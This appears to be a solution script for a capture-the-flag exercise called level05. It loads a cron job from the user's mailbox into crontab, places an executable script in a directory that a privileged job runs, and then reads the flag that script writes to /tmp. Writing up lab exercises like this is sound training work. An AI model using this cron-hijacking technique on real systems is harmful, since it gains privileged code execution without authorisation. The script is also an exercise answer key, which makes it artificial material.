#!/bin/bash
set -x

# 1. Add the job into crontab from mail
crontab -l
cat /var/mail/level05 | sed 's/\/2//' | crontab -
crontab -l

# 2. Create the script that will execute getflag
echo "getflag > /tmp/flag05" > /opt/openarenaserver/script
chmod +x /opt/openarenaserver/script

# 3. Display the output of getflag,
echo "Waiting for 'getflag' output...\n"

sleep 1m
cat /tmp/flag05